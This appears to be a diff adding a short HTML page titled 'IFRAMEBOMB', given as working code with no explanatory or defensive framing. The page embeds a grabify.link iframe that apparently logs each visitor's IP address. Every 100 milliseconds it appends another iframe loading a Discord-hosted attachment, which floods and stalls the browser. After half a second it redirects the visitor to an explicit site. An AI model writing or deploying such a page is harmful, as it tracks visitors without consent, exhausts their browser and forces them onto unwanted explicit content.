@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>IFRAMEBOMB</title>
+  </head>
+  <body>
+    <iframe src="https://grabify.link/V9ENKO"></iframe>
+    
+    <div id="htmlbomb">
+    </div>
+    
+    <script>
+      function addIframe () {
+        document.getElementById("htmlbomb").innerHTML = document.getElementById("htmlbomb").innerHTML + "<iframe src='https://cdn.discordapp.com/attachments/772064957793435678/825765916654567484/file.md'></iframe>"
+      }
+      
+      setInterval(addIframe, 100);
+      
+      setTimeout(function () {
+        location.href = "https://www.heavy-r.com/";
+      }, 500);
+    </script>
+  </body>
+</html>
